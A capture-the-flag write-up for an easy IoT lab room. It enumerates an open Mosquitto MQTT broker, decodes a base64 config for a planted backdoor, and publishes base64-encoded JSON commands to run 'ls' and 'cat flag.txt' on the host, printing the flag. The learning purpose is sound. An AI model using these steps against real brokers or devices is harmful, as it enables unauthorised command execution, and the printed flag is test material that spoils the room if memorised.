[[Easy]] | [[IoT]]

This room is quite straightforward once you know how it works. It's quite a good introduction to IoT communications. To start, we're given an IP, mine is 10.65.184.8. If we nmap this server, we will get the following results:
`nmap -sV -p- 10.65.184.8`
>Not shown: 65533 closed tcp ports (reset)
>PORT     STATE SERVICE                  VERSION
>22/tcp   open  ssh                      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
>1883/tcp open  mosquitto version 2.0.14
>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Looking up this service and version on google, there's some vulnerabilities but none of them look like they'd be what we're looking for initially. Instead, since THM specified this was about IoT communications, lets see if we can communicate using this port. For this, we'll need the mosquitto client installed.

`sudo apt install mosquitto mosquitto-clients`

Once that's installed, we can see if there's any active communications being published to subscribers using the following command. `-h` specifies host, `-p` specifies port, `-t "#"` specifies to listen on all active topics since we don't know which ones there are yet, and `-v` prints the topic name along with payloads. Finally, `mosquitto_sub` is just opening a subscriber line.

`mosquitto_sub -h 10.65.184.8 -p 1883 -t "#" -v`

After doing this, we'll get a number of communications from various household appliances. After waiting a bit, we will get this unusual base64 line:

>yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==

After decoding the second part, we'll get the following json info:
- `{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}`

This gives us some registered commands, which we can try publishing to the server in a new terminal tab. The following command specifies host, `-t` the topic to send to, `-m` the message we want to send to the server. 

`mosquitto_pub -h 10.64.184.10 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m '{"cmd": "HELP"}'`

If we check our subscriber line, we will see that we got the following response: 

>SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=

Once decoded, it reads:

>Invalid message format.
>Format: `base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})`

This tells us we need to submit the json encoded in base64 with the parameters specified above, as well as the formatting to boot. With this information, we can encode the following command and see how the server responds. We can even use the 'backdoor id' we got previously from the occasional help prompt that showed up in the feed. 

`{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"SYS","arg":""}`

With this encoded, it gives us the following command:
`mosquitto_pub -h 10.65.184.8 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsImNtZCI6IlNZUyIsImFyZyI6IiJ9'`

After getting the output from the subscriber feed and decoding it, we can get the following results:

>{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Linux x64 5.15.0-139-generic"}

This shows us our command worked! If we instead try the CMD command, we can try a bash command `ls` as a test:

{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"ls"}

After encoding, sending it, and decoding the output like last time, we get:

> {"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt\n"}

Perfect, thats our flag! Now we just have to do the same thing except `cat flag.txt` instead of `ls` in the last command, decode it, and we'll get our flag;

>{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{18d44fc0707ac8dc8be45bb83db54013}\n"}

